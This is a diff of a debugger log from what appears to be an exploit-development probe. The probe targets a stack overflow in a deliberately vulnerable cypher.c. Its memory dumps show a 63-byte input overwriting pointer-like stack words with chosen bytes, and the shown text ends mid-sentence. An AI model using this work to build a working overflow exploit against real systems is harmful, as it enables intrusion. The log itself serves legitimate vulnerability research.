@@ -1,4 +1,4 @@
-codebasememory2shell W12 higher-stride probe, 2026-11-24T22:05:52Z
+codebasememory2shell W12 higher-stride probe, 2026-11-24T22:08:30Z
 binary: /tmp/cbm-w12-far, pinned vulnerable cypher.c, same flags as build.sh plain target
 
 === build ===
@@ -17,11 +17,11 @@ Breakpoint 1, execute_return_simple (rb=0x7fffffffe030, max_rows=100000, bind_co
 
 === frame-relative state at the end of the projection loop ===
 callee_rbp=0x7fffffffdff0 canary(rbp-0x38)=0x7fffffffdfb8 func_bufs[39]=rbp+0x1c0=0x7fffffffe1b0
-0x7fffffffdfb8:	0x250af0c6ca67ac00
+0x7fffffffdfb8:	0x2821afafad982600
 0x7fffffffe1b0:	0x4f4f2d454853494d	0x3736353433323130
 0x7fffffffe1c0:	0x4645444342413938	0x0000000000000000
 0x7fffffffe1d0:	0x00005555556f6b30	0x00007ffff7ffd000
-0x7fffffffe1e0:	0xdf173715f283a995	0xdf17276f72a1a995
+0x7fffffffe1e0:	0x38ab46a8d4ec982f	0x38ab56d254ce982f
 0x7fffffffe1f0:	0x0000000000000000
 
 === 63-byte value: chosen bytes cover the pointer-like words at rbp+0x1d0/+0x1d8 ===
@@ -36,14 +36,14 @@ Breakpoint 1, execute_return_simple (rb=0x7fffffffe000, max_rows=100000, bind_co
 
 === 63-byte frame write ===
 callee_rbp=0x7fffffffdfc0 canary(rbp-0x38)=0x7fffffffdf88
-0x7fffffffdf88:	0x3741c91f15f8ef00
+0x7fffffffdf88:	0x25738be81a8cf000
 0x7fffffffe180:	0x4f4f2d454853494d	0x3736353433323130
 0x7fffffffe190:	0x4645444342413938	0x4e4d4c4b4a494847
 0x7fffffffe1a0:	0x565554535251504f	0x646362615a595857
 0x7fffffffe1b0:	0x6c6b6a6968676665	0x74737271706f6e6d
 0x7fffffffe1c0:	0x00007a7978777675	0x0000000000000000
 0x7fffffffe1d0:	0x0000000000000000	0x000055555567e375
-0x7fffffffe1e0:	0x00007fffffffe270	0x3741c91f15f8ef00
+0x7fffffffe1e0:	0x00007fffffffe270	0x25738be81a8cf000
 0x7fffffffe1f0:	0x00007fffffffe250	0x00007ffff7c2a28b
 The words at rbp+0x1d0/+0x1d8 held 0x5555.../0x7fff... with a 23-byte value
 and hold chosen ASCII with 63 bytes; the process still returns RC=0, so
